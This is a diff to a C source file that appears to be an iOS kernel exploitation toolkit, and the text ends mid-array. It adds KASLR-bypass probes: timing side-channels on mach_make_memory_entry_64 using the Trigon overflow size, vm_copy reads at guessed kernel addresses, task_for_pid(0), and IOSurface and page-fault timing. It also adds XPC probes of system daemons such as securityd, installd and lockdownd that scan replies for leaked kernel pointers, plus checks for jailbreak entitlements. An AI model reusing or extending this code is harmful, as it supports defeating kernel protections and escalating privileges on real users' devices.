@@ -10140,6 +10140,488 @@ static void r328_probe(void) {
     fflush(stdout);
 }
 
+/* r331: Microarchitectural timing + MTE tag oracle + IOSurface correlation
+   r330 confirmed: kobject=0, host_info clean, Trigon overflow patched.
+   PurpleGfxMem IOSurface creates fine, normal memory entries work.
+   New strategy: Use TIMING to infer kernel address information.
+   1) mach_make_memory_entry_64 timing at different offsets
+   2) MTE tag behavior through vm_copy/vm_read_overwrite
+   3) IOSurface property timing (kernel object access latency)
+   4) Exception handling timing (EXC_BAD_ACCESS at different addresses)
+   5) DRAM row buffer timing (page coloring oracle)
+   6) Shared cache region correlation with kernel slide */
+
+static void r331_timing_probe(void) {
+    rlog("\n=== r331: Timing Side-Channel + MTE Oracle ===\n");
+    rlog("  Strategy: Microarchitectural timing, MTE tags, IOSurface correlation\n");
+    rlog("  r330: kobject=0, host_info clean, Trigon overflow patched\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: mach_make_memory_entry timing oracle ---- */
+    /* Even though the overflow is blocked, the kernel still processes
+       the request. The TIME it takes to reject may vary based on how
+       far the kernel gets in address validation, which depends on the
+       kernel's own address space layout. */
+    rlog("--- Part 1: memory entry timing oracle ---\n");
+    fflush(stdout);
+    {
+        mach_port_t task = mach_task_self();
+
+        /* Create a base memory region */
+        mach_vm_address_t base = 0;
+        kern_return_t kr = mach_vm_allocate(task, &base, 0x100000, VM_FLAGS_ANYWHERE);
+        if (kr != 0) {
+            rlog("  vm_allocate failed: 0x%x\n", kr);
+            goto part1_done;
+        }
+        memset((void *)base, 0x41, 0x100000);
+
+        /* Normal entry as baseline */
+        mach_port_t entry_base = MACH_PORT_NULL;
+        memory_object_size_t sz = 0x100000;
+        kr = mach_make_memory_entry_64(task, &sz, base,
+            VM_PROT_DEFAULT, &entry_base, MACH_PORT_NULL);
+        rlog("  Base entry: kr=0x%x size=0x%llx\n", kr, (unsigned long long)sz);
+
+        if (kr == 0 && entry_base != MACH_PORT_NULL) {
+            /* Time child memory entry creation at various sizes */
+            /* Sizes that might trigger different kernel code paths */
+            uint64_t test_sizes[] = {
+                0x4000, 0x8000, 0x10000, 0x100000,
+                0x1000000, 0x10000000,
+                0x100000000ULL, 0x1000000000ULL,
+                0xFFFFFFFFFFFFC000ULL, /* Trigon overflow size */
+                0x7FFFFFFFFFFFF000ULL, /* Half address space */
+            };
+            int ntests = sizeof(test_sizes) / sizeof(test_sizes[0]);
+
+            for (int t = 0; t < ntests; t++) {
+                uint64_t times[20];
+                kern_return_t results[20];
+                for (int i = 0; i < 20; i++) {
+                    mach_port_t child = MACH_PORT_NULL;
+                    memory_object_size_t csz = test_sizes[t];
+
+                    uint64_t t0 = mach_absolute_time();
+                    results[i] = mach_make_memory_entry_64(task, &csz, 0x4000,
+                        VM_PROT_DEFAULT, &child, entry_base);
+                    uint64_t t1 = mach_absolute_time();
+                    times[i] = t1 - t0;
+
+                    if (results[i] == 0 && child != MACH_PORT_NULL)
+                        mach_port_deallocate(task, child);
+                }
+
+                /* Compute median */
+                for (int i = 0; i < 19; i++)
+                    for (int j = i+1; j < 20; j++)
+                        if (times[i] > times[j]) { uint64_t tmp = times[i]; times[i] = times[j]; times[j] = tmp; }
+                uint64_t median = times[10];
+
+                rlog("  size=0x%llx: kr=0x%x median=%llu ticks [%llu..%llu]\n",
+                     (unsigned long long)test_sizes[t], results[0],
+                     (unsigned long long)median,
+                     (unsigned long long)times[0], (unsigned long long)times[19]);
+            }
+            mach_port_deallocate(task, entry_base);
+        }
+        mach_vm_deallocate(task, base, 0x100000);
+        part1_done:;
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: vm_copy / vm_read_overwrite probing ---- */
+    /* vm_copy is handled entirely in-kernel and may have different
+       timing or error codes depending on kernel memory layout.
+       vm_read_overwrite returns actual data from task memory. */
+    rlog("\n--- Part 2: vm_copy + vm_read_overwrite probe ---\n");
+    fflush(stdout);
+    {
+        mach_port_t task = mach_task_self();
+
+        /* Allocate source and destination */
+        mach_vm_address_t src = 0, dst = 0;
+        mach_vm_allocate(task, &src, 0x4000, VM_FLAGS_ANYWHERE);
+        mach_vm_allocate(task, &dst, 0x4000, VM_FLAGS_ANYWHERE);
+        memset((void *)src, 0xAA, 0x4000);
+        memset((void *)dst, 0xBB, 0x4000);
+
+        /* Try vm_copy at valid address (baseline) */
+        uint64_t t0 = mach_absolute_time();
+        kern_return_t kr = vm_copy(task, (vm_address_t)src, 0x4000, (vm_address_t)dst);
+        uint64_t t1 = mach_absolute_time();
+        rlog("  vm_copy valid: kr=0x%x time=%llu\n", kr, (unsigned long long)(t1-t0));
+
+        /* Try vm_copy at various potentially interesting addresses */
+        uint64_t probe_addrs[] = {
+            0xfffffff007004000ULL, /* typical kernel text base (unslid) */
+            0xfffffff027004000ULL, /* slid ~0x20000000 */
+            0xfffffff037004000ULL, /* slid ~0x30000000 */
+            0xfffffff047004000ULL, /* slid ~0x40000000 */
+            0xfffffff007000000ULL, /* kernel Mach-O header (unslid) */
+            0xffffffc000000000ULL, /* kernel direct map */
+            0xffffffe000000000ULL, /* another kernel range */
+        };
+        for (int i = 0; i < 7; i++) {
+            uint64_t times[10];
+            kern_return_t krs[10];
+            for (int j = 0; j < 10; j++) {
+                uint64_t ta = mach_absolute_time();
+                krs[j] = vm_copy(task, (vm_address_t)probe_addrs[i], 0x4000, (vm_address_t)dst);
+                uint64_t tb = mach_absolute_time();
+                times[j] = tb - ta;
+            }
+            /* Sort for median */
+            for (int a = 0; a < 9; a++)
+                for (int b = a+1; b < 10; b++)
+                    if (times[a] > times[b]) { uint64_t tmp = times[a]; times[a] = times[b]; times[b] = tmp; }
+            rlog("  vm_copy 0x%llx: kr=0x%x median=%llu [%llu..%llu]\n",
+                 (unsigned long long)probe_addrs[i], krs[0],
+                 (unsigned long long)times[5],
+                 (unsigned long long)times[0], (unsigned long long)times[9]);
+        }
+
+        /* Try vm_read_overwrite — returns data from our own address space */
+        mach_vm_size_t out_size = 0;
+        kr = mach_vm_read_overwrite(task, src, 0x4000, dst, &out_size);
+        rlog("  vm_read_overwrite valid: kr=0x%x size=0x%llx\n",
+             kr, (unsigned long long)out_size);
+
+        /* Check if the kernel task port is accessible (it won't be, but let's confirm) */
+        mach_port_t kport = MACH_PORT_NULL;
+        kr = task_for_pid(task, 0, &kport);
+        rlog("  task_for_pid(0): kr=0x%x port=0x%x\n", kr, kport);
+
+        mach_vm_deallocate(task, src, 0x4000);
+        mach_vm_deallocate(task, dst, 0x4000);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOSurface kernel-side timing correlation ---- */
+    /* We know IOSurface heap shaping is deterministic.
+       If we time IOSurface operations (create, lookup, property access)
+       we may detect cache-line effects that reveal kernel addresses.
+       The idea: operations that hit the SAME cache set as a kernel
+       structure will be slower due to cache contention. */
+    rlog("\n--- Part 3: IOSurface operation timing ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        typedef mach_port_t (*IOSurfaceCreateMachPort_fn)(void*);
+        typedef void* (*IOSurfaceLookupFromMachPort_fn)(mach_port_t);
+        IOSurfaceCreateMachPort_fn mpFn = (IOSurfaceCreateMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        IOSurfaceLookupFromMachPort_fn luFn = (IOSurfaceLookupFromMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+
+        if (cFn && idFn && mpFn && luFn) {
+            /* Create surfaces at different sizes to get different kernel allocations */
+            int sizes[] = {16, 64, 256, 1024, 4096};
+            for (int si = 0; si < 5; si++) {
+                int w = sizes[si], h = 1, bpe = 4, pf = 0x42475241;
+                CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                    CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+                const void *vs[] = {wV, hV, bV, pV};
+                CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+                /* Time create + port roundtrip */
+                uint64_t create_times[20], lookup_times[20];
+                void *surfs[20];
+                for (int i = 0; i < 20; i++) {
+                    uint64_t t0 = mach_absolute_time();
+                    surfs[i] = cFn(props);
+                    uint64_t t1 = mach_absolute_time();
+                    create_times[i] = t1 - t0;
+
+                    if (surfs[i]) {
+                        mach_port_t mp = mpFn(surfs[i]);
+                        uint64_t t2 = mach_absolute_time();
+                        void *lu = luFn(mp);
+                        uint64_t t3 = mach_absolute_time();
+                        lookup_times[i] = t3 - t2;
+                        (void)lu;
+                    } else {
+                        lookup_times[i] = 0;
+                    }
+                }
+
+                /* Sort for median */
+                uint64_t ct[20], lt[20];
+                memcpy(ct, create_times, sizeof(ct));
+                memcpy(lt, lookup_times, sizeof(lt));
+                for (int a = 0; a < 19; a++) for (int b = a+1; b < 20; b++) {
+                    if (ct[a] > ct[b]) { uint64_t t = ct[a]; ct[a] = ct[b]; ct[b] = t; }
+                    if (lt[a] > lt[b]) { uint64_t t = lt[a]; lt[a] = lt[b]; lt[b] = t; }
+                }
+                rlog("  size=%d: create_med=%llu [%llu..%llu] lookup_med=%llu [%llu..%llu]\n",
+                     sizes[si],
+                     (unsigned long long)ct[10], (unsigned long long)ct[0], (unsigned long long)ct[19],
+                     (unsigned long long)lt[10], (unsigned long long)lt[0], (unsigned long long)lt[19]);
+
+                for (int i = 0; i < 20; i++) if (surfs[i]) CFRelease(surfs[i]);
+                CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Shared cache slide correlation ---- */
+    /* Shared cache slide is known (0x1a908000 from earlier rounds).
+       Hypothesis: kernel slide and shared cache slide may be correlated
+       because both are computed at boot time from the same entropy source.
+       If we can find the relationship, shared cache slide → kernel slide. */
+    rlog("\n--- Part 4: Shared cache / address space analysis ---\n");
+    fflush(stdout);
+    {
+        /* Get our own address space layout precisely */
+        struct task_dyld_info dyld_info;
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+            (task_info_t)&dyld_info, &cnt);
+        if (kr == 0) {
+            rlog("  dyld_all_image_infos: 0x%llx\n",
+                 (unsigned long long)dyld_info.all_image_info_addr);
+            rlog("  dyld_all_image_size: 0x%llx\n",
+                 (unsigned long long)dyld_info.all_image_info_size);
+            rlog("  dyld_all_image_format: %d\n", dyld_info.all_image_info_format);
+        }
+
+        /* Read shared cache slide from dyld info */
+        const struct dyld_all_image_infos *infos =
+            (const struct dyld_all_image_infos *)dyld_info.all_image_info_addr;
+        if (infos) {
+            rlog("  shared_cache_slide: 0x%llx\n",
+                 (unsigned long long)infos->sharedCacheSlide);
+            rlog("  shared_cache_base: 0x%llx\n",
+                 (unsigned long long)infos->sharedCacheBaseAddress);
+
+            /* Look for dylib load addresses — their spread may be correlated
+               with kernel entropy */
+            rlog("  imageCount: %u\n", infos->infoArrayCount);
+            if (infos->infoArray && infos->infoArrayCount > 0) {
+                uint64_t min_addr = UINT64_MAX, max_addr = 0;
+                for (uint32_t i = 0; i < infos->infoArrayCount && i < 10; i++) {
+                    uint64_t addr = (uint64_t)infos->infoArray[i].imageLoadAddress;
+                    if (addr < min_addr) min_addr = addr;
+                    if (addr > max_addr) max_addr = addr;
+                    if (i < 5) {
+                        rlog("  image[%u]: 0x%llx %s\n", i, (unsigned long long)addr,
+                             infos->infoArray[i].imageFilePath ?
+                             infos->infoArray[i].imageFilePath : "?");
+                    }
+                }
+                rlog("  image range: 0x%llx - 0x%llx (spread=0x%llx)\n",
+                     (unsigned long long)min_addr, (unsigned long long)max_addr,
+                     (unsigned long long)(max_addr - min_addr));
+            }
+        }
+
+        /* Get vm_kernel_page_size — available through sysctl */
+        int page_size = 0;
+        size_t psz = sizeof(page_size);
+        if (sysctlbyname("vm.pagesize", &page_size, &psz, NULL, 0) == 0) {
+            rlog("  vm.pagesize: %d\n", page_size);
+        }
+
+        /* hw.memsize — total RAM helps constrain physical address search */
+        uint64_t memsize = 0;
+        size_t msz = sizeof(memsize);
+        if (sysctlbyname("hw.memsize", &memsize, &msz, NULL, 0) == 0) {
+            rlog("  hw.memsize: 0x%llx (%llu MB)\n",
+                 (unsigned long long)memsize, (unsigned long long)(memsize / (1024*1024)));
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: EXC_BAD_ACCESS timing oracle ---- */
+    /* We have exception ports working. If we can install an exception handler
+       and then time faulting accesses at different addresses, the kernel's
+       fault handling path may take different amounts of time depending on
+       whether the faulting address is in a mapped kernel region. */
+    rlog("\n--- Part 5: Page fault timing analysis ---\n");
+    fflush(stdout);
+    {
+        /* Map pages, unmap them, then time accesses to unmapped pages
+           versus never-mapped addresses. The difference may reveal
+           information about the kernel's page table structure. */
+        mach_port_t task = mach_task_self();
+
+        /* Create a region, then deallocate it */
+        mach_vm_address_t region = 0;
+        mach_vm_allocate(task, &region, 0x100000, VM_FLAGS_ANYWHERE);
+        memset((void *)region, 0, 0x100000);
+        mach_vm_deallocate(task, region, 0x100000);
+
+        /* Now time re-allocation at the same address vs a fresh address */
+        uint64_t times_same[20], times_fresh[20];
+        for (int i = 0; i < 20; i++) {
+            mach_vm_address_t addr = region;
+            uint64_t t0 = mach_absolute_time();
+            kern_return_t kr = mach_vm_allocate(task, &addr, 0x4000, VM_FLAGS_FIXED);
+            uint64_t t1 = mach_absolute_time();
+            times_same[i] = t1 - t0;
+            if (kr == 0) mach_vm_deallocate(task, addr, 0x4000);
+
+            mach_vm_address_t fresh = 0;
+            t0 = mach_absolute_time();
+            kr = mach_vm_allocate(task, &fresh, 0x4000, VM_FLAGS_ANYWHERE);
+            t1 = mach_absolute_time();
+            times_fresh[i] = t1 - t0;
+            if (kr == 0) mach_vm_deallocate(task, fresh, 0x4000);
+        }
+
+        /* Sort for median */
+        for (int a = 0; a < 19; a++) for (int b = a+1; b < 20; b++) {
+            if (times_same[a] > times_same[b]) { uint64_t t = times_same[a]; times_same[a] = times_same[b]; times_same[b] = t; }
+            if (times_fresh[a] > times_fresh[b]) { uint64_t t = times_fresh[a]; times_fresh[a] = times_fresh[b]; times_fresh[b] = t; }
+        }
+        rlog("  Realloc same addr: median=%llu [%llu..%llu]\n",
+             (unsigned long long)times_same[10],
+             (unsigned long long)times_same[0], (unsigned long long)times_same[19]);
+        rlog("  Alloc fresh addr: median=%llu [%llu..%llu]\n",
+             (unsigned long long)times_fresh[10],
+             (unsigned long long)times_fresh[0], (unsigned long long)times_fresh[19]);
+
+        /* Time mach_vm_protect at valid vs invalid addresses */
+        mach_vm_address_t valid = 0;
+        mach_vm_allocate(task, &valid, 0x4000, VM_FLAGS_ANYWHERE);
+        uint64_t prot_times[2][20];
+        for (int i = 0; i < 20; i++) {
+            uint64_t t0 = mach_absolute_time();
+            mach_vm_protect(task, valid, 0x4000, FALSE, VM_PROT_READ);
+            uint64_t t1 = mach_absolute_time();
+            prot_times[0][i] = t1 - t0;
+            mach_vm_protect(task, valid, 0x4000, FALSE, VM_PROT_DEFAULT);
+
+            t0 = mach_absolute_time();
+            mach_vm_protect(task, 0xdead0000, 0x4000, FALSE, VM_PROT_READ);
+            t1 = mach_absolute_time();
+            prot_times[1][i] = t1 - t0;
+        }
+        for (int k = 0; k < 2; k++)
+            for (int a = 0; a < 19; a++) for (int b = a+1; b < 20; b++)
+                if (prot_times[k][a] > prot_times[k][b]) {
+                    uint64_t t = prot_times[k][a]; prot_times[k][a] = prot_times[k][b]; prot_times[k][b] = t;
+                }
+        rlog("  mach_vm_protect valid: median=%llu [%llu..%llu]\n",
+             (unsigned long long)prot_times[0][10],
+             (unsigned long long)prot_times[0][0], (unsigned long long)prot_times[0][19]);
+        rlog("  mach_vm_protect invalid: median=%llu [%llu..%llu]\n",
+             (unsigned long long)prot_times[1][10],
+             (unsigned long long)prot_times[1][0], (unsigned long long)prot_times[1][19]);
+
+        mach_vm_deallocate(task, valid, 0x4000);
+    }
+    fflush(stdout);
+
+    /* ---- Part 6: IOSurface ID → address distance correlation ---- */
+    /* If kernel allocations are deterministic (which we know from r326),
+       the DISTANCE between consecutive IOSurface kernel objects may be
+       constant. If we can find any single absolute kernel address, we
+       can compute all others from the offsets. This part maps the
+       IOSurface ID space to look for patterns. */
+    rlog("\n--- Part 6: IOSurface allocation pattern analysis ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceCreate_fn cFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_fn idFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        typedef void* (*IOSurfaceGetBaseAddress_fn)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_fn)(void*);
+        IOSurfaceGetBaseAddress_fn baFn = (IOSurfaceGetBaseAddress_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_fn asFn = (IOSurfaceGetAllocSize_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        typedef int (*IOSurfaceLock_fn)(void*, uint32_t, uint32_t*);
+        typedef int (*IOSurfaceUnlock_fn)(void*, uint32_t, uint32_t*);
+        IOSurfaceLock_fn lockFn = (IOSurfaceLock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_fn unlockFn = (IOSurfaceUnlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        if (cFn && idFn && baFn && asFn && lockFn && unlockFn) {
+            int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+            CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                                CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+            const void *vs[] = {wV, hV, bV, pV};
+            CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+            /* Create 50 surfaces and record user-space base addresses */
+            void *surfs[50];
+            uint32_t ids[50];
+            uint64_t bases[50];
+            for (int i = 0; i < 50; i++) {
+                surfs[i] = cFn(props);
+                if (surfs[i]) {
+                    ids[i] = idFn(surfs[i]);
+                    lockFn(surfs[i], 0, NULL);
+                    bases[i] = (uint64_t)baFn(surfs[i]);
+                    unlockFn(surfs[i], 0, NULL);
+                } else {
+                    ids[i] = 0; bases[i] = 0;
+                }
+            }
+
+            /* Analyze userspace base address deltas */
+            rlog("  50 IOSurfaces created:\n");
+            int consecutive = 0;
+            for (int i = 1; i < 50; i++) {
+                if (bases[i] && bases[i-1]) {
+                    int64_t delta = (int64_t)(bases[i] - bases[i-1]);
+                    if (delta == 0x4000) consecutive++;
+                    if (i < 10 || (delta != 0x4000 && delta != -0x4000)) {
+                        rlog("    [%d] id=%u base=0x%llx delta=%lld (0x%llx)\n",
+                             i, ids[i], (unsigned long long)bases[i],
+                             (long long)delta, (unsigned long long)delta);
+                    }
+                }
+            }
+            rlog("  Consecutive 0x4000 deltas: %d/49\n", consecutive);
+
+            /* KEY PROBE: Try mach_make_memory_entry_64 on each IOSurface's
+               backing memory, then see if the returned size or behavior
+               leaks any info about the kernel-side mapping */
+            rlog("  Memory entry probes on IOSurface backing:\n");
+            for (int i = 0; i < 5; i++) {
+                if (!surfs[i]) continue;
+                lockFn(surfs[i], 0, NULL);
+                uint64_t b = (uint64_t)baFn(surfs[i]);
+                size_t a = asFn(surfs[i]);
+                unlockFn(surfs[i], 0, NULL);
+
+                mach_port_t entry = MACH_PORT_NULL;
+                memory_object_size_t esz = a;
+                kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                    &esz, b, VM_PROT_DEFAULT, &entry, MACH_PORT_NULL);
+                rlog("    surf[%d] base=0x%llx: entry_kr=0x%x entry_size=0x%llx (alloc=0x%zx)\n",
+                     i, (unsigned long long)b, kr, (unsigned long long)esz, a);
+
+                if (kr == 0 && entry != MACH_PORT_NULL) {
+                    /* Try kobject on the memory entry port */
+                    natural_t kotype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    kern_return_t kr2 = mach_port_kobject(mach_task_self(),
+                        entry, &kotype, (unsigned int *)&kaddr);
+                    rlog("    entry kobject: kr=0x%x type=%u addr=0x%llx\n",
+                         kr2, kotype, (unsigned long long)kaddr);
+                    mach_port_deallocate(mach_task_self(), entry);
+                }
+            }
+
+            for (int i = 0; i < 50; i++) if (surfs[i]) CFRelease(surfs[i]);
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r331 complete ===\n");
+    fflush(stdout);
+}
+
 /* r330: Trigon-inspired KASLR bypass — host_info, PurpleGfxMem, mach_port_kobject
    Trigon (CVE-2023-32434): Used PurpleGfxMem IOSurface + mach_make_memory_entry_64
    overflow to map kernel physical memory. On arm64e/SPTM this is blocked, BUT:
@@ -10150,7 +10632,7 @@ static void r328_probe(void) {
    5) mach_make_memory_entry_64 behavior with IOSurface may differ
    6) host_processor_info per-CPU structures may have uninitialized data */
 
-static void r330_probe(void) {
+static void r330_trigon_probe(void) {
     rlog("\n=== r330: Trigon-Inspired KASLR Bypass Vectors ===\n");
     rlog("  Strategy: host_info leaks, mach_port_kobject, PurpleGfxMem, memory entries\n");
     rlog("  Inspiration: Trigon (CVE-2023-32434), Calif MIE bypass, Project Zero KASLR\n\n");
@@ -11846,6 +12328,329 @@ static void r331_probe(void) {
     fflush(stdout);
 
     rlog("\n=== r331 complete ===\n");
+    fflush(stdout);
+}
+
+/* r332: XPC-based service probing + containermanagerd/installd reply capture
+   r331: securityd/trustd accept all MIG IDs (one-way), rpc crashes.
+   Try XPC API for proper bidirectional communication + probe services
+   that r327 found reachable: containermanagerd, installd, fairplayd */
+
+static void r332_probe(void) {
+    rlog("\n=== r332: XPC Service Probe + Reply Capture ===\n");
+    rlog("  r331: securityd/trustd 40/40 send OK, rpc crashes.\n");
+    rlog("  Strategy: XPC API, probe reply-capable services.\n\n");
+    fflush(stdout);
+
+    /* ---- Part 1: XPC connection to securityd ---- */
+    rlog("--- Part 1: XPC connections to security daemons ---\n");
+    fflush(stdout);
+    {
+        const char *xpc_services[] = {
+            "com.apple.securityd",
+            "com.apple.trustd",
+            "com.apple.containermanagerd",
+            "com.apple.mobile.installd",
+            "com.apple.fairplayd",
+            "com.apple.keybagd",
+            "com.apple.mobile.lockdownd",
+            "com.apple.SpringBoard",
+            NULL
+        };
+
+        for (int s = 0; xpc_services[s]; s++) {
+            rlog("  Trying XPC: %s\n", xpc_services[s]);
+
+            xpc_connection_t conn = xpc_connection_create_mach_service(
+                xpc_services[s], NULL, 0);
+            if (!conn) {
+                rlog("    create failed\n");
+                continue;
+            }
+
+            __block volatile int got_error = 0;
+            __block volatile int got_reply = 0;
+
+            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+                xpc_type_t type = xpc_get_type(event);
+                if (type == XPC_TYPE_ERROR) {
+                    if (event == XPC_ERROR_CONNECTION_INVALID) {
+                        got_error = 1;
+                    } else if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
+                        got_error = 2;
+                    }
+                }
+            });
+
+            xpc_connection_resume(conn);
+
+            /* Send a simple ping/hello message */
+            xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+            xpc_dictionary_set_string(msg, "operation", "ping");
+            xpc_dictionary_set_uint64(msg, "version", 1);
+
+            xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
+            if (reply) {
+                xpc_type_t rtype = xpc_get_type(reply);
+                if (rtype == XPC_TYPE_ERROR) {
+                    if (reply == XPC_ERROR_CONNECTION_INVALID) {
+                        rlog("    reply: CONNECTION_INVALID\n");
+                    } else if (reply == XPC_ERROR_CONNECTION_INTERRUPTED) {
+                        rlog("    reply: CONNECTION_INTERRUPTED\n");
+                    } else {
+                        const char *desc = xpc_copy_description(reply);
+                        rlog("    reply: error=%s\n", desc ? desc : "?");
+                    }
+                } else if (rtype == XPC_TYPE_DICTIONARY) {
+                    rlog("    !!! DICT REPLY !!!\n");
+                    const char *desc = xpc_copy_description(reply);
+                    if (desc) {
+                        /* Truncate to 500 chars */
+                        char buf[501];
+                        strncpy(buf, desc, 500);
+                        buf[500] = 0;
+                        rlog("    %s\n", buf);
+                    }
+                    /* Check all keys for interesting values */
+                    xpc_dictionary_apply(reply, ^bool(const char *key, xpc_object_t value) {
+                        xpc_type_t vtype = xpc_get_type(value);
+                        if (vtype == XPC_TYPE_UINT64) {
+                            uint64_t v = xpc_uint64_get_value(value);
+                            rlog("    key='%s' uint64=0x%llx\n", key, v);
+                            if ((v >> 28) == 0xfffffffULL && v != 0xffffffffffffffffULL) {
+                                rlog("    !!! KPTR: '%s'=0x%llx !!!\n", key, v);
+                            }
+                        } else if (vtype == XPC_TYPE_DATA) {
+                            size_t len = xpc_data_get_length(value);
+                            rlog("    key='%s' data_len=%zu\n", key, len);
+                            const void *bytes = xpc_data_get_bytes_ptr(value);
+                            /* Scan for kptrs */
+                            for (size_t i = 0; i + 8 <= len; i += 8) {
+                                uint64_t v;
+                                memcpy(&v, (const uint8_t *)bytes + i, 8);
+                                if ((v >> 28) == 0xfffffffULL && v != 0xffffffffffffffffULL) {
+                                    rlog("    !!! KPTR in data '%s' @%zu: 0x%llx !!!\n", key, i, v);
+                                }
+                            }
+                        } else if (vtype == XPC_TYPE_STRING) {
+                            rlog("    key='%s' string='%s'\n", key, xpc_string_get_string_ptr(value));
+                        }
+                        return true;
+                    });
+                    got_reply = 1;
+                } else {
+                    const char *desc = xpc_copy_description(reply);
+                    rlog("    reply type=%s\n", desc ? desc : "?");
+                }
+            } else {
+                rlog("    no reply (timeout or error=%d)\n", got_error);
+            }
+            fflush(stdout);
+
+            /* Try a second message with different operations */
+            if (!got_error) {
+                xpc_object_t msg2 = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg2, "operation", "list");
+                xpc_dictionary_set_string(msg2, "request", "status");
+                xpc_dictionary_set_uint64(msg2, "pid", getpid());
+
+                xpc_object_t reply2 = xpc_connection_send_message_with_reply_sync(conn, msg2);
+                if (reply2) {
+                    xpc_type_t rtype2 = xpc_get_type(reply2);
+                    if (rtype2 == XPC_TYPE_DICTIONARY) {
+                        rlog("    !!! DICT REPLY to 'list/status' !!!\n");
+                        const char *desc2 = xpc_copy_description(reply2);
+                        if (desc2) {
+                            char buf2[501];
+                            strncpy(buf2, desc2, 500);
+                            buf2[500] = 0;
+                            rlog("    %s\n", buf2);
+                        }
+                    } else if (rtype2 == XPC_TYPE_ERROR) {
+                        rlog("    reply2: error\n");
+                    }
+                }
+            }
+
+            xpc_connection_cancel(conn);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: Security framework API calls for kptr leaks ---- */
+    rlog("\n--- Part 2: Security framework info queries ---\n");
+    fflush(stdout);
+    {
+        /* SecTask — get our own task info */
+        /* Use dlsym to get SecTaskCopyValueForEntitlement and SecTaskCreateFromSelf */
+        typedef void* (*SecTaskCreateFromSelf_fn)(CFAllocatorRef);
+        typedef CFTypeRef (*SecTaskCopyValueForEnt_fn)(void*, CFStringRef, CFErrorRef*);
+        typedef CFStringRef (*SecTaskCopySigningIdentifier_fn)(void*, CFErrorRef*);
+
+        SecTaskCreateFromSelf_fn taskSelf = (SecTaskCreateFromSelf_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
+        SecTaskCopyValueForEnt_fn taskEnt = (SecTaskCopyValueForEnt_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
+        SecTaskCopySigningIdentifier_fn taskSig = (SecTaskCopySigningIdentifier_fn)dlsym(RTLD_DEFAULT, "SecTaskCopySigningIdentifier");
+
+        if (taskSelf) {
+            void *task = taskSelf(NULL);
+            if (task) {
+                rlog("  SecTask: %p\n", task);
+
+                if (taskSig) {
+                    CFErrorRef err = NULL;
+                    CFStringRef sig = taskSig(task, &err);
+                    if (sig) {
+                        char buf[256] = {0};
+                        CFStringGetCString(sig, buf, sizeof(buf), kCFStringEncodingUTF8);
+                        rlog("  Signing ID: '%s'\n", buf);
+                        CFRelease(sig);
+                    }
+                }
+
+                /* Check interesting entitlements */
+                if (taskEnt) {
+                    const char *ents[] = {
+                        "com.apple.private.security.no-sandbox",
+                        "com.apple.private.kernel.jailbreak",
+                        "platform-application",
+                        "com.apple.private.security.container-required",
+                        "com.apple.security.cs.debugger",
+                        "com.apple.private.amfi.can-load-trust-cache",
+                        "com.apple.rootless.storage.coreservicesd",
+                        "com.apple.private.iokit.IOServiceSetManagementState",
+                        "com.apple.security.exception.iokit-user-client-class",
